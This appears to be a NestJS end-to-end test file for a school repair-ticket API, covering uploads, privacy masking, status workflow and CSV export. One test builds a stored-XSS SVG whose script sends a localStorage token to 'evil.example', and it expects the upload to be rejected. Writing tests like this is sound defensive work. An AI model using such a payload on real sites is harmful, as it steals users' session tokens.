import { Test, TestingModule } from '@nestjs/testing';
import { NestExpressApplication } from '@nestjs/platform-express';
import { ThrottlerGuard } from '@nestjs/throttler';
import request from 'supertest';
import { existsSync, rmSync } from 'fs';
import { AppModule } from './../src/app.module';
import { AuthService } from './../src/auth/auth.service';
import { PrismaService } from './../src/prisma/prisma.service';
import { RepairsService } from './../src/repairs/repairs.service';
import { serveUploads } from './../src/uploads/serve-uploads';
import { setApiPrefix } from './../src/bootstrap';
import { apiRequest } from './support/api-request';
import { uploadFilePath } from './support/upload-file-path';
import { permissiveThrottlerGuard } from './support/permissive-throttler-guard';
import { Role, RepairStatus } from '@prisma/client';

// Minimal valid 1x1 PNG (real magic bytes) — required now that uploads are
// validated by content, not by client-declared mimetype or filename.
const PNG_BYTES = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=',
  'base64',
);

interface RepairTicketResponse {
  id: string;
  location: string;
  category: string;
  description: string;
  imageUrl: string | null;
  status: string;
  userName: string;
  userId: string;
  userPhone: string | null;
  userClass: string | null;
  resolvedByName: string | null;
}

interface RepairCategoryResponse {
  id: string;
  name: string;
}

describe('Repairs (e2e)', () => {
  let app: NestExpressApplication;
  let authService: AuthService;
  let prisma: PrismaService;
  let repairsService: RepairsService;
  let userToken: string;
  let otherUserToken: string;
  let adminToken: string;
  let facilityManagerToken: string;
  let adminUserId: string;
  let facilityManagerUserId: string;
  const createdUploadPaths: string[] = [];

  async function tokenFor(email: string, role: Role): Promise<string> {
    const { user } = await authService.loginWithGoogle({
      googleSub: `sub-${email}`,
      email,
      name: email,
      hostedDomain: 'school.edu.tw',
    });
    if (role !== user.role) {
      await prisma.user.update({ where: { id: user.id }, data: { role } });
    }
    const code = authService.createLoginCode(user.id);
    const { accessToken } = await authService.exchangeLoginCode(code);
    return accessToken;
  }

  beforeAll(async () => {
    const moduleFixture: TestingModule = await Test.createTestingModule({
      imports: [AppModule],
    })
      .overrideGuard(ThrottlerGuard)
      .useValue(permissiveThrottlerGuard)
      .compile();

    app = moduleFixture.createNestApplication<NestExpressApplication>();
    setApiPrefix(app);
    serveUploads(app);
    authService = moduleFixture.get(AuthService);
    prisma = moduleFixture.get(PrismaService);
    repairsService = moduleFixture.get(RepairsService);
    await app.init();

    userToken = await tokenFor('reporter@school.edu.tw', Role.USER);
    otherUserToken = await tokenFor('bystander@school.edu.tw', Role.USER);
    adminToken = await tokenFor('repairadmin@school.edu.tw', Role.ADMIN);
    facilityManagerToken = await tokenFor(
      'repairfacility@school.edu.tw',
      Role.FACILITY_MANAGER,
    );
    adminUserId = (
      await prisma.user.findUniqueOrThrow({
        where: { email: 'repairadmin@school.edu.tw' },
      })
    ).id;
    facilityManagerUserId = (
      await prisma.user.findUniqueOrThrow({
        where: { email: 'repairfacility@school.edu.tw' },
      })
    ).id;
  });

  afterAll(async () => {
    await prisma.auditLogEntry.deleteMany({});
    await prisma.repairTicket.deleteMany({});
    await prisma.repairCategory.deleteMany({
      where: { name: { startsWith: 'Test Category' } },
    });
    await prisma.account.deleteMany({});
    await prisma.user.deleteMany({});
    for (const path of createdUploadPaths) {
      if (existsSync(path)) rmSync(path);
    }
    await app.close();
  });

  it('rejects unauthenticated requests', () => {
    return apiRequest(app).get('/repairs').expect(401);
  });

  it('any authenticated User can submit a Repair Ticket without a photo', async () => {
    const res = await apiRequest(app)
      .post('/repairs')
      .set('Authorization', `Bearer ${userToken}`)
      .field('location', 'A101 會議室')
      .field('category', '硬體設備')
      .field('description', '投影機燈泡閃爍')
      .field('userClass', '資訊三甲')
      .field('userPhone', '0912-345-678')
      .expect(201);

    const body = res.body as RepairTicketResponse;
    expect(body.status).toBe('PENDING');
    expect(body.imageUrl).toBeNull();
    expect(body.userName).toEqual(expect.any(String));
  });

  it('any authenticated User can submit a Repair Ticket with a photo, and the photo is retrievable', async () => {
    const res = await apiRequest(app)
      .post('/repairs')
      .set('Authorization', `Bearer ${userToken}`)
      .field('location', '一樓大廳')
      .field('category', '桌椅家具')
      .field('description', '咖啡機漏水')
      .field('userClass', '資訊三甲')
      .field('userPhone', '0912-345-678')
      .attach('photo', PNG_BYTES, 'issue.png')
      .expect(201);

    const body = res.body as RepairTicketResponse;
    expect(body.imageUrl).toMatch(/^\/api\/uploads\/repairs\/.+\.png$/);
    createdUploadPaths.push(uploadFilePath(body.imageUrl as string));

    // Not apiRequest: imageUrl already includes the API prefix.
    const photoRes = await request(app.getHttpServer())
      .get(body.imageUrl as string)
      .expect(200);
    expect(photoRes.body).toEqual(PNG_BYTES);
    expect(photoRes.headers['x-content-type-options']).toBe('nosniff');
  });

  it("hides a reporter's phone/class and masks their name from other USER-role callers", async () => {
    const created = await apiRequest(app)
      .post('/repairs')
      .set('Authorization', `Bearer ${userToken}`)
      .field('location', 'PII 過濾測試')
      .field('category', '桌椅家具')
      .field('description', '個資過濾測試單')
      .field('userClass', '資訊三甲')
      .field('userPhone', '0912-345-678')
      .expect(201);
    const createdBody = created.body as RepairTicketResponse;

    const asOtherUser = await apiRequest(app)
      .get('/repairs')
      .set('Authorization', `Bearer ${otherUserToken}`)
      .expect(200);
    const seenByOtherUser = (asOtherUser.body as RepairTicketResponse[]).find(
      (t) => t.id === createdBody.id,
    );
    expect(seenByOtherUser?.userPhone).toBeNull();
    expect(seenByOtherUser?.userClass).toBeNull();
    expect(seenByOtherUser?.userName).not.toBe(createdBody.userName);

    const asOwner = await apiRequest(app)
      .get('/repairs')
      .set('Authorization', `Bearer ${userToken}`)
      .expect(200);
    const seenByOwner = (asOwner.body as RepairTicketResponse[]).find(
      (t) => t.id === createdBody.id,
    );
    expect(seenByOwner?.userPhone).toBe('0912-345-678');
    expect(seenByOwner?.userClass).toBe('資訊三甲');
    expect(seenByOwner?.userName).toBe(createdBody.userName);

    const asAdmin = await apiRequest(app)
      .get('/repairs')
      .set('Authorization', `Bearer ${adminToken}`)
      .expect(200);
    const seenByAdmin = (asAdmin.body as RepairTicketResponse[]).find(
      (t) => t.id === createdBody.id,
    );
    expect(seenByAdmin?.userPhone).toBe('0912-345-678');
    expect(seenByAdmin?.userClass).toBe('資訊三甲');

    const asFacilityManager = await apiRequest(app)
      .get('/repairs')
      .set('Authorization', `Bearer ${facilityManagerToken}`)
      .expect(200);
    const seenByFacilityManager = (
      asFacilityManager.body as RepairTicketResponse[]
    ).find((t) => t.id === createdBody.id);
    expect(seenByFacilityManager?.userPhone).toBe('0912-345-678');
    expect(seenByFacilityManager?.userClass).toBe('資訊三甲');
  });

  it('rejects an SVG upload masquerading as a photo (stored XSS vector)', () => {
    const svgPayload = Buffer.from(
      "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>fetch('https://evil.example/collect?t='+localStorage.getItem('meetfix_token'))</script></svg>",
    );
    return apiRequest(app)
      .post('/repairs')
      .set('Authorization', `Bearer ${userToken}`)
      .field('location', '一樓大廳')
      .field('category', '桌椅家具')
      .field('description', '惡意上傳測試')
      .attach('photo', svgPayload, {
        filename: 'x.svg',
        contentType: 'image/svg+xml',
      })
      .expect(400);
  });

  it('rejects a photo upload whose content is not a real image, regardless of declared filename/mimetype', () => {
    return apiRequest(app)
      .post('/repairs')
      .set('Authorization', `Bearer ${userToken}`)
      .field('location', '一樓大廳')
      .field('category', '桌椅家具')
      .field('description', '惡意上傳測試')
      .attach('photo', Buffer.from('not-a-real-image'), {
        filename: 'issue.png',
        contentType: 'image/png',
      })
      .expect(400);
  });

  it('rejects submission missing required fields', () => {
    return apiRequest(app)
      .post('/repairs')
      .set('Authorization', `Bearer ${userToken}`)
      .field('location', 'A101')
      .expect(400);
  });

  it('rejects submission with a blank userClass', () => {
    return apiRequest(app)
      .post('/repairs')
      .set('Authorization', `Bearer ${userToken}`)
      .field('location', 'A101')
      .field('category', '硬體設備')
      .field('description', 'test')
      .field('userClass', '')
      .field('userPhone', '0912-345-678')
      .expect(400);
  });

  it('rejects submission with a blank userPhone', () => {
    return apiRequest(app)
      .post('/repairs')
      .set('Authorization', `Bearer ${userToken}`)
      .field('location', 'A101')
      .field('category', '硬體設備')
      .field('description', 'test')
      .field('userClass', '資訊三甲')
      .field('userPhone', '')
      .expect(400);
  });

  it('writes the submitted userClass/userPhone back onto the reporting User, and a later submission pre-fills from it', async () => {
    const writebackToken = await tokenFor('writeback@school.edu.tw', Role.USER);
    const reporter = await prisma.user.findUniqueOrThrow({
      where: { email: 'writeback@school.edu.tw' },
    });
    expect(reporter.userClass).toBeNull();
    expect(reporter.userPhone).toBeNull();

    await apiRequest(app)
      .post('/repairs')
      .set('Authorization', `Bearer ${writebackToken}`)
      .field('location', 'A101')
      .field('category', '硬體設備')
      .field('description', 'first submission')
      .field('userClass', '資訊三甲')
      .field('userPhone', '0912-345-678')
      .expect(201);

    const meRes = await apiRequest(app)
      .get('/auth/me')
      .set('Authorization', `Bearer ${writebackToken}`)
      .expect(200);
    expect(meRes.body).toMatchObject({
      class: '資訊三甲',
      phone: '0912-345-678',
    });

    // A second submission with a different value overwrites the profile.
    await apiRequest(app)
      .post('/repairs')
      .set('Authorization', `Bearer ${writebackToken}`)
      .field('location', 'B202')
      .field('category', '硬體設備')
      .field('description', 'second submission')
      .field('userClass', '資訊三乙')
      .field('userPhone', '0987-654-321')
      .expect(201);

    const updatedUser = await prisma.user.findUniqueOrThrow({
      where: { email: 'writeback@school.edu.tw' },
    });
    expect(updatedUser.userClass).toBe('資訊三乙');
    expect(updatedUser.userPhone).toBe('0987-654-321');
  });

  it('rejects submission with a category that is not in the Admin-managed list', () => {
    return apiRequest(app)
      .post('/repairs')
      .set('Authorization', `Bearer ${userToken}`)
      .field('location', 'A101')
      .field('category', 'Not A Real Category')
      .field('description', 'test')
      .expect(400);
  });

  it('a roomId field submitted alongside a Repair Ticket is ignored — location is always free text (#19)', async () => {
    const res = await apiRequest(app)
      .post('/repairs')
      .set('Authorization', `Bearer ${userToken}`)
      .field('roomId', 'some-room-id')
      .field('location', '手動輸入的地點')
      .field('category', '硬體設備')
      .field('description', '電視螢幕無法開機')
      .field('userClass', '資訊三甲')
      .field('userPhone', '0912-345-678')
      .expect(201);

    const body = res.body as RepairTicketResponse;
    expect(body).not.toHaveProperty('roomId');
    expect(body.location).toBe('手動輸入的地點');
  });

  describe('Repair Ticket processing (Maintenance)', () => {
    async function createTicket(): Promise<string> {
      const res = await apiRequest(app)
        .post('/repairs')
        .set('Authorization', `Bearer ${userToken}`)
        .field('location', 'C303 教室')
        .field('category', '硬體設備')
        .field('description', '燈管不亮')
        .field('userClass', '資訊三甲')
        .field('userPhone', '0912-345-678')
        .expect(201);
      return (res.body as RepairTicketResponse).id;
    }

    it('rejects updates from a non-FACILITY_MANAGER, non-ADMIN User', async () => {
      const id = await createTicket();
      await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${userToken}`)
        .send({ status: 'IN_PROGRESS' })
        .expect(403);
    });

    it('FACILITY_MANAGER can move a ticket PENDING -> IN_PROGRESS -> COMPLETED', async () => {
      const id = await createTicket();

      const started = await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${facilityManagerToken}`)
        .send({ status: 'IN_PROGRESS' })
        .expect(200);
      expect((started.body as RepairTicketResponse).status).toBe('IN_PROGRESS');

      const completed = await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${facilityManagerToken}`)
        .send({ status: 'COMPLETED' })
        .expect(200);
      expect((completed.body as RepairTicketResponse).status).toBe('COMPLETED');
    });

    it('ADMIN can also move a ticket through the workflow', async () => {
      const id = await createTicket();
      const res = await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${adminToken}`)
        .send({ status: 'IN_PROGRESS' })
        .expect(200);
      expect((res.body as RepairTicketResponse).status).toBe('IN_PROGRESS');
    });

    it('rejects skipping a status (PENDING -> COMPLETED)', async () => {
      const id = await createTicket();
      await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${facilityManagerToken}`)
        .send({ status: 'COMPLETED' })
        .expect(400);
    });

    it('rejects moving a COMPLETED ticket back to PENDING (more than one step back)', async () => {
      const id = await createTicket();
      await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${facilityManagerToken}`)
        .send({ status: 'IN_PROGRESS' })
        .expect(200);
      await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${facilityManagerToken}`)
        .send({ status: 'COMPLETED' })
        .expect(200);

      await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${facilityManagerToken}`)
        .send({ status: 'PENDING' })
        .expect(400);
    });

    it('FACILITY_MANAGER can revert a ticket one status step back (IN_PROGRESS -> PENDING, COMPLETED -> IN_PROGRESS)', async () => {
      const id = await createTicket();
      await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${facilityManagerToken}`)
        .send({ status: 'IN_PROGRESS' })
        .expect(200);

      const revertedToPending = await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${facilityManagerToken}`)
        .send({ status: 'PENDING' })
        .expect(200);
      expect((revertedToPending.body as RepairTicketResponse).status).toBe(
        'PENDING',
      );

      await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${facilityManagerToken}`)
        .send({ status: 'IN_PROGRESS' })
        .expect(200);
      await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${facilityManagerToken}`)
        .send({ status: 'COMPLETED' })
        .expect(200);

      const revertedToInProgress = await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${facilityManagerToken}`)
        .send({ status: 'IN_PROGRESS' })
        .expect(200);
      expect((revertedToInProgress.body as RepairTicketResponse).status).toBe(
        'IN_PROGRESS',
      );
    });

    it('a revert racing a concurrent advance on the same IN_PROGRESS ticket results in exactly one applied transition', async () => {
      const id = await createTicket();
      await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${facilityManagerToken}`)
        .send({ status: 'IN_PROGRESS' })
        .expect(200);

      // Raced through the full HTTP boundary (two apiRequest() calls in
      // Promise.all, as every other concurrency test in this file/
      // bookings.e2e-spec.ts does), this race window is too narrow to land
      // reliably: updateStatus()'s findUnique-then-write round trip is fast
      // enough on a local Postgres that one request's guard/JWT-validation
      // overhead alone is almost always enough for the second request's
      // read to land after the first's write already committed — so the
      // outer in-memory transition check (not the persistence-layer guard
      // this test exists to verify) ends up being what rejects the loser,
      // every time, regardless of whether that guard exists. Calling
      // RepairsService.updateStatus() directly removes that overhead and
      // reliably reproduces both requests reading the same pre-transition
      // status before either commits.
      const [revertRes, advanceRes] = await Promise.allSettled([
        repairsService.updateStatus(facilityManagerUserId, id, {
          status: RepairStatus.PENDING,
        }),
        repairsService.updateStatus(adminUserId, id, {
          status: RepairStatus.COMPLETED,
        }),
      ]);

      // Exactly one of the two must actually persist — the loser must be
      // rejected (a thrown ConflictException, surfaced here as a rejected
      // promise), never silently overwritten or silently overwriting.
      const outcomes = [revertRes.status, advanceRes.status].sort();
      expect(outcomes).toEqual(['fulfilled', 'rejected']);

      const final = await prisma.repairTicket.findUniqueOrThrow({
        where: { id },
      });
      const winnerStatus =
        revertRes.status === 'fulfilled' ? 'PENDING' : 'COMPLETED';
      expect(final.status).toBe(winnerStatus);

      // The Audit Log Entry trail must agree with the final persisted
      // status — the loser's write (and its would-be audit entry) never
      // happened, so exactly one REPAIR_STATUS_CHANGE entry describes a
      // transition FROM this ticket's IN_PROGRESS state, and it matches
      // the winner.
      const entries = await prisma.auditLogEntry.findMany({
        where: {
          targetType: 'RepairTicket',
          targetId: id,
          action: 'REPAIR_STATUS_CHANGE',
          detail: { startsWith: 'Status changed from IN_PROGRESS to' },
        },
      });
      expect(entries).toHaveLength(1);
      expect(entries[0].detail).toBe(
        `Status changed from IN_PROGRESS to ${winnerStatus}`,
      );
    });

    it('FACILITY_MANAGER can attach a reply when updating a ticket', async () => {
      const id = await createTicket();
      const res = await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${facilityManagerToken}`)
        .send({ status: 'IN_PROGRESS', adminReply: '已預約零件，明日到場處理' })
        .expect(200);
      expect(
        (res.body as RepairTicketResponse & { adminReply: string }).adminReply,
      ).toBe('已預約零件，明日到場處理');
    });

    it('404s when updating a Repair Ticket that does not exist', () => {
      return apiRequest(app)
        .patch('/repairs/not-a-real-ticket')
        .set('Authorization', `Bearer ${facilityManagerToken}`)
        .send({ status: 'IN_PROGRESS' })
        .expect(404);
    });

    it('attaches a reply-only update without touching status', async () => {
      const id = await createTicket();
      const res = await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${facilityManagerToken}`)
        .send({ adminReply: '正在調度零件' })
        .expect(200);

      const body = res.body as RepairTicketResponse & { adminReply: string };
      expect(body.adminReply).toBe('正在調度零件');
      expect(body.status).toBe('PENDING');
    });

    it('resolvedByName is null for a ticket that has not been completed', async () => {
      const id = await createTicket();
      await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${facilityManagerToken}`)
        .send({ status: 'IN_PROGRESS' })
        .expect(200);

      const listing = await apiRequest(app)
        .get('/repairs')
        .set('Authorization', `Bearer ${facilityManagerToken}`)
        .expect(200);
      const ticket = (listing.body as RepairTicketResponse[]).find(
        (t) => t.id === id,
      );
      expect(ticket?.resolvedByName).toBeNull();
    });

    it('resolvedByName is the FACILITY_MANAGER who marked the ticket COMPLETED', async () => {
      const id = await createTicket();
      await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${facilityManagerToken}`)
        .send({ status: 'IN_PROGRESS' })
        .expect(200);
      await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${facilityManagerToken}`)
        .send({ status: 'COMPLETED' })
        .expect(200);

      const listing = await apiRequest(app)
        .get('/repairs')
        .set('Authorization', `Bearer ${facilityManagerToken}`)
        .expect(200);
      const ticket = (listing.body as RepairTicketResponse[]).find(
        (t) => t.id === id,
      );
      expect(ticket?.resolvedByName).toBe('repairfacility@school.edu.tw');
    });

    it('resolvedByName reflects the most recent completer after a revert and re-completion by someone else', async () => {
      const id = await createTicket();
      await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${facilityManagerToken}`)
        .send({ status: 'IN_PROGRESS' })
        .expect(200);
      await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${facilityManagerToken}`)
        .send({ status: 'COMPLETED' })
        .expect(200);
      // Revert back to IN_PROGRESS, then have a different actor (ADMIN) mark
      // it COMPLETED again — the latest completer should win.
      await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${facilityManagerToken}`)
        .send({ status: 'IN_PROGRESS' })
        .expect(200);
      await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${adminToken}`)
        .send({ status: 'COMPLETED' })
        .expect(200);

      const listing = await apiRequest(app)
        .get('/repairs')
        .set('Authorization', `Bearer ${facilityManagerToken}`)
        .expect(200);
      const ticket = (listing.body as RepairTicketResponse[]).find(
        (t) => t.id === id,
      );
      expect(ticket?.resolvedByName).toBe('repairadmin@school.edu.tw');
    });
  });

  describe('Repair Ticket editing + deletion (#25)', () => {
    async function createTicket(token: string = userToken): Promise<string> {
      const res = await apiRequest(app)
        .post('/repairs')
        .set('Authorization', `Bearer ${token}`)
        .field('location', 'D404 教室')
        .field('category', '硬體設備')
        .field('description', '插座故障')
        .field('userClass', '資訊三甲')
        .field('userPhone', '0912-345-678')
        .expect(201);
      return (res.body as RepairTicketResponse).id;
    }

    it('the reporter can edit location/category/description on a PENDING ticket', async () => {
      const id = await createTicket();
      const res = await apiRequest(app)
        .patch(`/repairs/${id}/content`)
        .set('Authorization', `Bearer ${userToken}`)
        .field('location', '更新後的地點')
        .field('category', '桌椅家具')
        .field('description', '更新後的描述')
        .expect(200);

      const body = res.body as RepairTicketResponse;
      expect(body.location).toBe('更新後的地點');
      expect(body.category).toBe('桌椅家具');
      expect(body.description).toBe('更新後的描述');
      expect(body.status).toBe('PENDING');
    });

    it('the reporter can replace an existing photo with a new one', async () => {
      const created = await apiRequest(app)
        .post('/repairs')
        .set('Authorization', `Bearer ${userToken}`)
        .field('location', '有照片的地點')
        .field('category', '硬體設備')
        .field('description', '原始照片')
        .field('userClass', '資訊三甲')
        .field('userPhone', '0912-345-678')
        .attach('photo', PNG_BYTES, 'original.png')
        .expect(201);
      const id = (created.body as RepairTicketResponse).id;
      createdUploadPaths.push(
        uploadFilePath((created.body as RepairTicketResponse).imageUrl as string),
      );

      const res = await apiRequest(app)
        .patch(`/repairs/${id}/content`)
        .set('Authorization', `Bearer ${userToken}`)
        .attach('photo', PNG_BYTES, 'replacement.png')
        .expect(200);
      const body = res.body as RepairTicketResponse;
      expect(body.imageUrl).toMatch(/^\/api\/uploads\/repairs\/.+\.png$/);
      createdUploadPaths.push(uploadFilePath(body.imageUrl as string));
    });

    it('the reporter can remove an existing photo entirely', async () => {
      const created = await apiRequest(app)
        .post('/repairs')
        .set('Authorization', `Bearer ${userToken}`)
        .field('location', '要移除照片的地點')
        .field('category', '硬體設備')
        .field('description', '待移除照片')
        .field('userClass', '資訊三甲')
        .field('userPhone', '0912-345-678')
        .attach('photo', PNG_BYTES, 'to-remove.png')
        .expect(201);
      const id = (created.body as RepairTicketResponse).id;
      createdUploadPaths.push(
        uploadFilePath((created.body as RepairTicketResponse).imageUrl as string),
      );

      const res = await apiRequest(app)
        .patch(`/repairs/${id}/content`)
        .set('Authorization', `Bearer ${userToken}`)
        .field('removePhoto', 'true')
        .expect(200);
      expect((res.body as RepairTicketResponse).imageUrl).toBeNull();
    });

    it('rejects editing with an unknown Repair Category', async () => {
      const id = await createTicket();
      await apiRequest(app)
        .patch(`/repairs/${id}/content`)
        .set('Authorization', `Bearer ${userToken}`)
        .field('category', 'Not A Real Category')
        .expect(400);
    });

    it('rejects editing a ticket that is IN_PROGRESS', async () => {
      const id = await createTicket();
      await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${facilityManagerToken}`)
        .send({ status: 'IN_PROGRESS' })
        .expect(200);

      await apiRequest(app)
        .patch(`/repairs/${id}/content`)
        .set('Authorization', `Bearer ${userToken}`)
        .field('description', 'Too late')
        .expect(409);
    });

    it('rejects editing a ticket that belongs to someone else', async () => {
      const id = await createTicket();
      await apiRequest(app)
        .patch(`/repairs/${id}/content`)
        .set('Authorization', `Bearer ${otherUserToken}`)
        .field('description', 'Hijacked')
        .expect(403);
    });

    it('an ADMIN can edit a PENDING ticket that belongs to someone else', async () => {
      const id = await createTicket();
      const res = await apiRequest(app)
        .patch(`/repairs/${id}/content`)
        .set('Authorization', `Bearer ${adminToken}`)
        .field('description', 'Fixed by admin')
        .expect(200);

      expect((res.body as RepairTicketResponse).description).toBe(
        'Fixed by admin',
      );
    });

    it('404s editing a Repair Ticket that does not exist', () => {
      return apiRequest(app)
        .patch('/repairs/not-a-real-ticket/content')
        .set('Authorization', `Bearer ${userToken}`)
        .field('description', 'Ghost')
        .expect(404);
    });

    it('the reporter can delete a PENDING ticket, and it disappears from the listing', async () => {
      const id = await createTicket();
      await apiRequest(app)
        .delete(`/repairs/${id}`)
        .set('Authorization', `Bearer ${userToken}`)
        .expect(204);

      const listing = await apiRequest(app)
        .get('/repairs')
        .set('Authorization', `Bearer ${userToken}`)
        .expect(200);
      const ids = (listing.body as RepairTicketResponse[]).map((t) => t.id);
      expect(ids).not.toContain(id);
    });

    it('rejects deleting a ticket that is IN_PROGRESS', async () => {
      const id = await createTicket();
      await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${facilityManagerToken}`)
        .send({ status: 'IN_PROGRESS' })
        .expect(200);

      await apiRequest(app)
        .delete(`/repairs/${id}`)
        .set('Authorization', `Bearer ${userToken}`)
        .expect(409);
    });

    it('rejects deleting a COMPLETED ticket', async () => {
      const id = await createTicket();
      await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${facilityManagerToken}`)
        .send({ status: 'IN_PROGRESS' })
        .expect(200);
      await apiRequest(app)
        .patch(`/repairs/${id}`)
        .set('Authorization', `Bearer ${facilityManagerToken}`)
        .send({ status: 'COMPLETED' })
        .expect(200);

      await apiRequest(app)
        .delete(`/repairs/${id}`)
        .set('Authorization', `Bearer ${userToken}`)
        .expect(409);
    });

    it('rejects deleting a ticket that belongs to someone else', async () => {
      const id = await createTicket();
      await apiRequest(app)
        .delete(`/repairs/${id}`)
        .set('Authorization', `Bearer ${otherUserToken}`)
        .expect(403);
    });

    it('an ADMIN can delete a PENDING ticket that belongs to someone else', async () => {
      const id = await createTicket();
      await apiRequest(app)
        .delete(`/repairs/${id}`)
        .set('Authorization', `Bearer ${adminToken}`)
        .expect(204);

      const listing = await apiRequest(app)
        .get('/repairs')
        .set('Authorization', `Bearer ${adminToken}`)
        .expect(200);
      const ids = (listing.body as RepairTicketResponse[]).map((t) => t.id);
      expect(ids).not.toContain(id);
    });

    it('404s deleting a Repair Ticket that does not exist', () => {
      return apiRequest(app)
        .delete('/repairs/not-a-real-ticket')
        .set('Authorization', `Bearer ${userToken}`)
        .expect(404);
    });
  });

  describe('Repair Ticket export (bulk, #35)', () => {
    async function createTicket(
      location: string,
      token: string = userToken,
    ): Promise<string> {
      const res = await apiRequest(app)
        .post('/repairs')
        .set('Authorization', `Bearer ${token}`)
        .field('location', location)
        .field('category', '硬體設備')
        .field('description', '匯出測試用報修單')
        .field('userClass', '資訊三甲')
        .field('userPhone', '0912-345-678')
        .expect(201);
      return (res.body as RepairTicketResponse).id;
    }

    it('rejects export from a non-FACILITY_MANAGER, non-ADMIN User', async () => {
      await apiRequest(app)
        .get('/repairs/export')
        .set('Authorization', `Bearer ${userToken}`)
        .expect(403);
    });

    it('FACILITY_MANAGER can export all Repair Tickets as CSV with Chinese headers and BOM, excluding reporter PII', async () => {
      await createTicket('匯出測試地點 A');

      const res = await apiRequest(app)
        .get('/repairs/export')
        .set('Authorization', `Bearer ${facilityManagerToken}`)
        .expect(200);

      expect(res.headers['content-type']).toContain('text/csv');
      expect(res.headers['content-disposition']).toContain('attachment');
      expect(res.text.charCodeAt(0)).toBe(0xfeff);
      expect(res.text).toContain('地點,分類,描述,狀態,維修人員,管理員回覆,建立時間');
      expect(res.text).toContain('匯出測試地點 A');
      expect(res.text).toContain('待處理');
      // Reporter PII (name/class/phone) is deliberately excluded from the
      // bulk export — it's a downloadable file that can leave the system,
      // unlike the in-app listing.
      expect(res.text).not.toContain('資訊三甲');
      expect(res.text).not.toContain('0912-345-678');
    });

    it('ADMIN can also export', async () => {
      await createTicket('匯出測試地點 ADMIN');
      const res = await apiRequest(app)
        .get('/repairs/export')
        .set('Authorization', `Bearer ${adminToken}`)
        .expect(200);
      expect(res.text).toContain('匯出測試地點 ADMIN');
    });

    it('populates 維修人員 for a completed ticket and leaves it blank for a pending one', async () => {
      const completedId = await createTicket('匯出測試已完成單');
      await apiRequest(app)
        .patch(`/repairs/${completedId}`)
        .set('Authorization', `Bearer ${facilityManagerToken}`)
        .send({ status: 'IN_PROGRESS' })
        .expect(200);
      await apiRequest(app)
        .patch(`/repairs/${completedId}`)
        .set('Authorization', `Bearer ${facilityManagerToken}`)
        .send({ status: 'COMPLETED' })
        .expect(200);
      await createTicket('匯出測試待處理單');

      const res = await apiRequest(app)
        .get('/repairs/export')
        .set('Authorization', `Bearer ${facilityManagerToken}`)
        .expect(200);

      const rows = res.text.split('\r\n');
      const completedRow = rows.find((r) => r.includes('匯出測試已完成單'));
      const pendingRow = rows.find((r) => r.includes('匯出測試待處理單'));
      expect(completedRow).toContain('repairfacility@school.edu.tw');
      expect(pendingRow).toContain('待處理,,'); // 狀態,維修人員(空白),管理員回覆(空白)
    });

    it('filters exported tickets by createdAt date range, inclusive of the full end day', async () => {
      const inRangeId = await createTicket('匯出範圍內');
      const beforeRangeId = await createTicket('匯出範圍前');
      const afterRangeId = await createTicket('匯出範圍後');

      await prisma.repairTicket.update({
        where: { id: inRangeId },
        data: { createdAt: new Date('2026-03-15T12:00:00.000Z') },
      });
      await prisma.repairTicket.update({
        where: { id: beforeRangeId },
        data: { createdAt: new Date('2026-03-09T23:59:59.999Z') },
      });
      await prisma.repairTicket.update({
        where: { id: afterRangeId },
        data: { createdAt: new Date('2026-03-21T00:00:00.000Z') },
      });

      const res = await apiRequest(app)
        .get('/repairs/export?from=2026-03-10&to=2026-03-20')
        .set('Authorization', `Bearer ${facilityManagerToken}`)
        .expect(200);

      expect(res.text).toContain('匯出範圍內');
      expect(res.text).not.toContain('匯出範圍前');
      expect(res.text).not.toContain('匯出範圍後');
    });

    it('excludes soft-deleted Repair Tickets from the export', async () => {
      const id = await createTicket('匯出應排除的已刪除單');
      await apiRequest(app)
        .delete(`/repairs/${id}`)
        .set('Authorization', `Bearer ${userToken}`)
        .expect(204);

      const res = await apiRequest(app)
        .get('/repairs/export')
        .set('Authorization', `Bearer ${facilityManagerToken}`)
        .expect(200);
      expect(res.text).not.toContain('匯出應排除的已刪除單');
    });

    it('rejects a malformed date query param', () => {
      return apiRequest(app)
        .get('/repairs/export?from=not-a-date')
        .set('Authorization', `Bearer ${facilityManagerToken}`)
        .expect(400);
    });

    it('rejects a from date after the to date', () => {
      return apiRequest(app)
        .get('/repairs/export?from=2026-03-20&to=2026-03-10')
        .set('Authorization', `Bearer ${facilityManagerToken}`)
